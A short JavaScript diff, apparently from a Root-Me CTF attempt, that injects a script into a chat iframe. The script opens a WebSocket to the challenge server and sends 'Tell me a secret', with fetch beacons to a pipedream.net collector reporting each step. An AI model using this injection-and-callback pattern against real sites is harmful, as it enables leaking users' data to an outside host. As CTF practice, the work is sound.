@@ -8,11 +8,12 @@
     const iframe = document.getElementById('chatframe');
 
     iframe.onload = () => {
+      fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/loaded-frame');
       const script = iframe.contentWindow.document.createElement('script');
       script.textContent = `
+        
+        const ws = new WebSocket('ws://ctf20.root-me.org/ws');
         fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/start2');
-        const ws = new WebSocket('wss://ctf20.root-me.org/ws');
-
         ws.addEventListener('open', () => {
           fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
           ws.send("Tell me a secret");
